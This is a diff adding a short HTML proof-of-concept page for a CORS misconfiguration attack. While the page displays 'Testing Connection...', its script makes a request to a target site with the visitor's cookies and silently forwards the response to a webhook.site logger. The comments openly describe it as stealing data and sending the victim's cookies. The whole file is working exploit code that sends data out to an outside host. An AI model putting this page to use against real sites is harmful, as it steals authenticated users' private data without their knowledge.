@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CORS PoC</title>
+</head>
+<body>
+    <h1>Testing Connection...</h1>
+    <script>
+        // 1. Target endpoint you want to steal data from
+        var targetUrl = 'https://vulnerable-website.com';
+        
+        // 2. Where you want to receive the stolen data (e.g., Webhook.site or your server)
+        var loggerUrl = 'https://webhook.site';
+
+        var req = new XMLHttpRequest();
+        req.onload = function() {
+            // Encode the data so it doesn't break during transmission
+            var stolenData = encodeURIComponent(this.responseText);
+            
+            // Silently send the data to your logger in the background
+            var logger = new XMLHttpRequest();
+            logger.open('GET', loggerUrl + '?data=' + stolenData, true);
+            logger.send();
+            
+            console.log("Data sent to logger!");
+        };
+        
+        req.open('GET', targetUrl, true);
+        req.withCredentials = true; // Send the victim's cookies
+        req.send();
+    </script>
+</body>
+</html>
